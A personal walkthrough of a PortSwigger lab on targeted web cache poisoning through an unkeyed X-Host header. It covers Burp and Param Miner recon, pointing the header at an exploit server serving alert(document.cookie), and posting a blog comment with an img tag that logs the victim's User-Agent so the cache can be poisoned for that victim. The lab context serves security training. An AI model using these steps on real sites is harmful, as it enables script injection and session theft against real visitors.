# [Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

- This lab handles unkeyed header in an unsafe way, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.
- The victim regularly reads posts

## recon

- open the lab in burp browser
- send the `/` request to repeater
- send it again
- the `X-Cache: miss` changes to `X-Cache: hit`
- it caches the response

---

**use a cachebuster to make the exploit testing only for you**
`/?qwe=asd`

- in this case the `User-Agent` can be used as a cachebuster as well

---

- start a Param Miner (extension) on the request to check what headers might be exploitable
- `Extensions` -> `Param Miner` -> `Guess Headers`
- it will give back the `X-Host`
- `X-Host` is unkeyed, so if that changes the cachekey will not change, so any exploit with `X-Host` will not stay in the cache
- test it with `x-host: example.com`
- the response should have a script that will be used for the exploit

```
<script type="text/javascript" src="//example.com/resources/js/tracking.js">
```

## exploit setup

- add the exploit server to the `X-Host: exploit-...-server.net`
- change the exploit file to `/resources/js/tracking.js`
- add the `alert(document.cookie)` to the exploit server body
- store the exploit
- go back to the page and add the url the `/?qwe=asd`
- reload the page
- it should give an `alert` what means it works
- now, in the repeater send the request without the `?qwe=asd`
- aka send only as `/`
- but nothing happened
- in the repeater response there is a `Vary: User-Agent`
- this means that the page can look different depending on the browser or device asking for it
- need to get the victim browser data

## exploit

- find a blog, and post the following message:

```
<img src="https://exploit-...-server.net/resources/js/tracking.js">

```

- then check the exploit server logs (button in the store button row)
- refresh the page a couple times until you get a log about the victim browser

```
"user-agent: Mozilla/5.0 (Victim) ..."
```

- replace with this the request `user-agent`
- send the request
